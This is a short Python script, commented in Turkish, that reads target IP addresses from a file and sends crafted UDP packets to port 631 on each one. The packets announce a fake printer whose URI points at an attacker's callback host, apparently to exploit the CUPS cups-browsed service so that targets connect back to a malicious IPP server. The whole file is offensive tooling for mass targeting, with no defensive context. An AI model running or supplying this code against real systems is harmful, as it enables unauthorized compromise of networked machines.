import socket
import sys
import time
from threading import Thread

def send_udp_packet(destination_ip, host_callback):
  
    resource_uri = f'http://{host_callback}:80/printers/NAME'
    resource_info = 'Printer'
    payload = f"0x00 0x03 {resource_uri} \"{resource_info}\"".encode('utf-8')
    
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
        print(f"Sending UDP packet to {destination_ip}:631 ...")
        udp_socket.sendto(payload, (destination_ip, 631))

def handle_target_ips(host_callback, file_input):
    
    with open(file_input, 'r') as ip_file:
        target_ips = ip_file.read().strip().splitlines()

    threads = []
    for ip in target_ips:
        thread = Thread(target=send_udp_packet, args=(ip, host_callback))
        thread.start()
        threads.append(thread)
        time.sleep(0.1)  # Her paket arasında gecikme

    for thread in threads:
        thread.join()  # Tüm iş parçacıklarının tamamlanmasını bekle

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <HOST_CALLBACK> <FILE_INPUT>")
        sys.exit(1)

    HOST_CALLBACK = sys.argv[1]
    FILE_INPUT = sys.argv[2]
    handle_target_ips(HOST_CALLBACK, FILE_INPUT)
